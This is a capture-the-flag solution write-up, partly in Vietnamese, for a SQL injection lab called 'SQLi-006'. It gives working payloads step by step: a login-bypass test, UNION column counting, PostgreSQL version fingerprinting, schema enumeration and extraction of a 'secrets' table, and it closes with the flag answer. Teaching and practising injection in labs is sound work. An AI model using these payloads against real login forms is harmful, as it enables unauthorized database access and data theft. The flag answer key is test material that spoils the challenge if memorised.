# SQLi-006 Solution: Version Query Fingerprinting

## Step 1: Test SQL Injection

**Test payload:**

```
username=' OR 1=1--&password=x
```

Nếu login thành công hoặc có error → SQLi confirmed

---

## Step 2: Determine Number of Columns

**Test UNION:**

```sql
username=' UNION SELECT NULL--&password=x
username=' UNION SELECT NULL,NULL--&password=x
username=' UNION SELECT NULL,NULL,NULL--&password=x
username=' UNION SELECT NULL,NULL,NULL,NULL--&password=x
```

✅ **Result:** Query có 4 cột

---

## Step 3: Version Query Detection

**Test các version queries để fingerprint DBMS:**

### MySQL/MSSQL:

```sql
username=' UNION SELECT 1,@@version,3,4--&password=x
```

❌ **Result:** ERROR (không phải MySQL/MSSQL)

### PostgreSQL:

```sql
username=' UNION SELECT 1,version(),3,4--&password=x
```

✅ **Result:** SUCCESS! Trả về version PostgreSQL

---

## Step 4: Enumerate Database

**List all tables:**

```sql
username=' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema='public'--&password=x
```

**List columns của table `secrets`:**

```sql
username=' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='secrets'--&password=x
```

Kết quả: `id, name, value`

---

## Step 5: Extract Flag

**Final payload:**

```sql
username=' UNION SELECT id,name,value,value FROM secrets--&password=x
```

**URL Encoded:**

```
username='+UNION+SELECT+id,name,value,value+FROM+secrets--&password=x
```

**Response:**

```
Welcome, sqli_006! Role: FLAG{v3rs10n_qu3ry_p0stgr3sql_1d3nt1f13d}
```

---

## Flag

```
FLAG{v3rs10n_qu3ry_p0stgr3sql_1d3nt1f13d}
```

---

## Key Learnings

1. **PostgreSQL version query:** `SELECT version()`
2. **MySQL/MSSQL version query:** `SELECT @@version`
3. **Oracle version query:** `SELECT banner FROM v$version`
4. **SQLite version query:** `SELECT sqlite_version()`
5. PostgreSQL dùng `--` cho single-line comment (cần space sau)
6. Luôn xác định số cột trước khi UNION attack
